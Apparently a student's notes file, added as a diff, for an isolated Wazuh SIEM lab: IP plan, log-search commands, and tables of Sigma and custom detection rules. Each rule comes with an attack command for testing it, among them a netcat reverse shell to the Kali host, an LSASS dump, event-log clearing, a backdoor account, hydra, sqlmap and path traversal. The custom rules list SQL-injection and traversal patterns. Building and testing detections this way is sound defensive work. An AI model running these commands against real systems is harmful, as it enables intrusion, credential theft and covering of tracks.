@@ -1,0 +1,149 @@
+Yep — these are the IPs we chose earlier for your lab design (Host-Only isolated lab network):
+
+VM	Role	Hostname (suggested)	IP	Why
+Ubuntu Server	Wazuh Manager + Indexer + Dashboard (SIEM)	wazuh-server	192.168.56.10/24	Static because all agents must always know where to send logs
+Windows Server 2019	Active Directory (AD DS)	cnss-ad	192.168.56.20/24	Static because domain services should not move
+Ubuntu Client	Normal employee/server machine + Wazuh Agent	ubuntu-client	192.168.56.30/24	Static for lab simplicity
+Kali Linux	Attack / security testing machine + Wazuh Agent (optional)	kali-lab	192.168.56.40/24	Static so attack source stays identifiable
+Network
+Network:     192.168.56.0/24
+Mask:        255.255.255.0
+Gateway:     (leave empty for now)
+DNS:         192.168.56.20   ← after AD is installed
+
+
+
+Lab view:
+
+             VMware Host-Only (VMnet2)
+                     192.168.56.0/24
+                           │
+      ┌────────────────────┼────────────────────┐
+      │                    │                    │
+      │                    │                    │
+192.168.56.10       192.168.56.20        192.168.56.40
+Wazuh Server        Windows AD           Kali
+(Server+Indexer)      (DNS/DC)         (attacker)
+
+                    │
+                    │
+              192.168.56.30
+              Ubuntu Client
+
+
+
+----------------------------------------------------------------------------
+            USEFUL COMMANDS :
+----------------------------------------------------------------------------
+- wazuh manager : 
+
+# See all Tomcat raw logs
+sudo grep "localhost_access_log" /var/ossec/logs/archives/archives.log
+
+# See them in JSON (structured)
+sudo grep "localhost_access_log" /var/ossec/logs/archives/archives.json | python3 -m json.tool
+
+# Live tail
+sudo tail -f /var/ossec/logs/archives/archives.log | grep "localhost_access_log"
+
+# count of loaded rules 
+sudo grep "Total rules enabled" /var/ossec/logs/ossec.log | tail
+
+# search for specific alert
+sudo grep -i "Suspicious C2" /var/ossec/logs/alerts/alerts.log
+
+# search for alerts by rule id
+sudo grep -r "100002" /var/ossec/logs/alerts/
+
+-----------------------------------------------------------------------------------------------
+
+
+
+
+| Category    | #  | Rule                   | Source       | File Path                                                                          |
+| ----------- | -- | ---------------------- | ------------ | ---------------------------------------------------------------------------------- |
+| **Windows** | 1  | Brute Force / 4625     | ❌ **CUSTOM** | `custom_brute_force_4625.yml`                                                      |
+| **Windows** | 2  | Encoded PowerShell     | ✅ Sigma      | `windows/process_creation/proc_creation_win_powershell_encode.yml`                 |
+| **Windows** | 3  | Mimikatz               | ✅ Sigma      | `windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml`        |
+| **Windows** | 4a | Net User Add           | ✅ Sigma      | `windows/process_creation/proc_creation_win_net_user_add.yml`                      |
+| **Windows** | 4b | Local Admin Group Add  | ✅ Sigma      | `windows/process_creation/proc_creation_win_susp_add_user_local_admin_group.yml`   |
+| **Windows** | 5  | Event Log Cleared      | ✅ Sigma      | `windows/builtin/security/win_security_audit_log_cleared.yml`                      |
+| **Windows** | 6  | Suspicious CMD         | ❌ **CUSTOM** | `custom_susp_cmd_whoami.yml`                                                       |
+| **Windows** | 7  | Scheduled Tasks        | ✅ Sigma      | `windows/process_creation/proc_creation_win_schtasks_creation.yml`                 |
+| **Windows** | 8a | LSASS — Procdump       | ✅ Sigma      | `windows/process_creation/proc_creation_win_sysinternals_procdump_lsass.yml`       |
+| **Windows** | 8b | LSASS — COMSVCS        | ✅ Sigma      | `windows/process_creation/proc_creation_win_rundll32_process_dump_via_comsvcs.yml` |
+| **Windows** | 9  | Suspicious Network     | ✅ Sigma      | `windows/process_creation/proc_creation_win_pua_netcat.yml`                        |
+| **Windows** | 10 | WMIC Remote            | ✅ Sigma      | `windows/process_creation/proc_creation_win_wmic_remote_execution.yml`             |
+| **Linux**   | —  | Kill Command           | ❌ **CUSTOM** | `custom_linux_kill.yml`                                                            |
+| **Linux**   | —  | Shell Spawn            | ✅ Sigma      | `linux/process_creation/proc_creation_lnx_bash_interactive_shell.yml`              |
+| **Linux**   | —  | Shell Spawn (Tomcat)   | ✅ Sigma      | `linux/process_creation/proc_creation_lnx_webshell_detection.yml`                  |   ----
+| **Linux**   | —  | Auditd Suspicious      | ✅ Sigma      | `linux/auditd/lnx_auditd_susp_c2_commands.yml`                                     |    MRYGL
+| **Linux**   | —  | interactive bash shell | ✅ Sigma      | `linux/auditd/lnx_bash_interactive_shell.yml`                                      | MRYGL 
+| **Linux**   | —  | SSH Brute Force        | ❌ **CUSTOM** | `custom_ssh_brute_force.yml`                                                       |
+| **Web**     | 1  | Suspicious User-Agents | ✅ Sigma      | `web/webserver_generic/web_susp_useragents.yml`                                    |
+| **Web**     | 2  | SQL Injection          | ✅ Sigma      | `web/webserver_generic/web_sql_injection_in_access_logs.yml`                       |
+| **Web**     | 3  | Path Traversal         | ❌ **CUSTOM** | `custom_web_path_traversal.yml`                                                    |
+| **Web**     | 4  | WAR Deployment         | ❌ **CUSTOM** | `custom_tomcat_war_upload.yml`                                                     |
+| **Web**     | 5  | Webshell Access        | ✅ Sigma      | `web/webserver_generic/web_win_webshells_in_access_logs.yml`                       |
+| **Custom**  | —  | Sudo Escalation        | ❌ **CUSTOM** | `custom_sudo_escalation.yml`                                                       |
+
+
+
+
+
+
+
+
+
+
+
+*Windows Rules (10 rules)
+
+
+| #  | Rule File                                       | Detects                                | Test With                                                |
+| -- | ----------------------------------------------- | -------------------------------------- | -------------------------------------------------------- |
+| 1  | `win_susp_failed_logons.yml`                    | Multiple failed logins (Event ID 4625) | `hydra -l admin -P rockyou.txt rdp://192.168.56.20`      |
+| 2  | `proc_creation_win_susp_powershell_enc_cmd.yml` | PowerShell with encoded commands       | `powershell -enc <base64>`                               |
+| 3  | `proc_creation_win_mimikatz_command_line.yml`   | Mimikatz execution                     | Run `mimikatz.exe`                                       |
+| 4  | `proc_creation_win_net_user_add.yml`            | `net user /add` commands               | `net user hacker Pass123 /add`                           |
+| 5  | `win_event_log_cleared.yml`                     | Security log cleared (Event ID 1102)   | `wevtutil cl Security`                                   |
+
+(ADVANCED Windows Rules)
+
+| 6  | `proc_creation_win_susp_cmd.yml`                | Suspicious `cmd.exe` usage             | `cmd.exe /c whoami`                                      |
+| 7  | `proc_creation_win_susp_schtasks.yml`           | Scheduled task creation                | `schtasks /create /tn backdoor /tr cmd.exe`              |
+| 8  | `proc_creation_win_lsass_access.yml`            | LSASS memory access                    | `procdump -ma lsass.exe`                                 |
+| 9  | `proc_creation_win_susp_network_connection.yml` | Suspicious network connections         | `nc -e cmd.exe 192.168.56.40 4444`                       |
+| 10 | `proc_creation_win_wmic_remote.yml`             | WMI remote execution                   | `wmic /node:192.168.56.20 process call create "cmd.exe"` |
+
+
+Linux Rules (4 rules)
+
+| # | Rule File                                 | Detects                        | Test With                           |
+| - | ----------------------------------------- | ------------------------------ | ----------------------------------- |
+| 1 | `proc_creation_lnx_susp_kill_command.yml` | Kill / killall / pkill / xkill | `kill -9 <pid>`                     |
+| 2 | `proc_creation_lnx_susp_shell_spawn.yml`  | Shell spawning from web apps   | Tomcat exploit → `/bin/bash`        | ---------
+| 3 | `lnx_auditd_susp_cmds.yml`                | Suspicious commands via auditd | type=CONFIG_CHANGE msg=audit(1712345678.123:12345): auid=1000 ses=1 subj=unconfined op=add_rule key="susp_activity" list=4 res=1 | mrygl
+| 4 | `lnx_susp_ssh_login.yml`                  | Suspicious SSH patterns        | Multiple failed SSH from Kali       |
+| 5 | `lnx_bash_interactive_shell.yml`          | `bash -i` (reverse shell)      | `bash -i`                           | mrygl 
+
+
+Web / Tomcat Rules (5 rules)
+
+| # | Rule File                                      | Detects                    | Test With                                         |
+| - | ---------------------------------------------- | -------------------------- | ------------------------------------------------- |
+| 1 | `web_susp_useragents.yml`                      | Suspicious User-Agents     | `nikto -h 192.168.56.30`                          |
+| 2 | `web_sql_injection.yml` *(custom)*             | SQL injection patterns     | `sqlmap -u "http://192.168.56.30/app?id=1"`       |
+| 3 | `web_path_traversal.yml` *(custom)*            | Path traversal attempts    | `curl "http://192.168.56.30/../../../etc/passwd"` |
+| 4 | `apache_tomcat_susp_deployment.yml` *(custom)* | WAR file upload to manager | Metasploit `exploit/multi/http/tomcat_mgr_upload` |
+| 5 | `web_webshell_detection.yml`                   | Webshell access patterns   | Access uploaded JSP shell with `?cmd=whoami`      |
+
+
+Custom Rules You Must Write (4 rules)
+
+| # | Title                                   | Logsource                              | Detection Logic                                                                                              |
+| - | --------------------------------------- | -------------------------------------- | ------------------------------------------------------------------------------------------------------------ |
+| 1 | Apache Tomcat Suspicious WAR Deployment | `category: webserver, product: apache` | `cs-method: POST` + `cs-uri-stem` contains `/manager/html/upload` + `cs-uri-query` contains `.war`           |
+| 2 | Web SQL Injection Attempt               | `category: webserver, product: apache` | `cs-uri-query` contains any of: `UNION SELECT`, `sleep(`, `1=1`, `' OR '`, `exec(`, `xp_cmdshell`            |
+| 3 | Web Path Traversal Attempt              | `category: webserver, product: apache` | `cs-uri-stem` contains any of: `../`, `..%2f`, `....//`, `/etc/passwd`, `/windows/win.ini`                   |
+| 4 | Sudo Privilege Escalation               | `product: linux, service: auditd`      | `type: SYSCALL` + `exe` ends with `/sudo` + `auid` contains `1000`, filter out `apt`, `apt-get`, `ls`, `cat` |
